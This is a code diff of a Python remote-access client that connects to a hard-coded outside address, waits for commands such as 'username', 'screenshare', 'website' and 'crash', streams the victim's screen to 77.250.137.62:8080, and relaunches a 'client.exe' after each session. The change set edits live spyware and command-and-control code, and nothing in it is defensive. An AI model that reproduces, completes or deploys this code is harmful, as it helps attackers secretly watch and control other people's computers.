@@ -24,15 +24,16 @@ except:
 def main():
     while (keepgoing == True):
         try:
-            sockk = connnect()
+            sockk = connnnect()
             while keepgoing == True:
+                sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                 msg = recv(sockk)
                 if msg == "exit":
                     exit()
                 elif msg == "username":
                     username(sockk)
                 elif msg == "screenshare":
-                    screenshare()
+                    screenshare(sockk)
                 elif msg == "website":
                     website(sockk)
                 elif msg == "crash":
@@ -53,11 +54,12 @@ def main():
         except Exception as err:
             print(Exception, err)
 
-def connnect():
+def connnnect():
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     address = (ip,port)
     sock.connect(address)
     return sock
+
 
 
 def download(sock):
@@ -90,14 +92,15 @@ def username(sock):
     sock.send(username.encode())
 
 
-def screenshare():
+def screenshare(sock):
     sock.close()
     sender = ScreenShareClient("77.250.137.62", 8080)
     t = threading.Thread(target=sender.start_stream)
     t.start()
-    time.sleep(60)
+    time.sleep(15)
     sender.stop_stream()
-    connect()
+    source = os.getcwd() + "\\client.exe"
+    os.startfile(source)
 
 
 def website(sock):
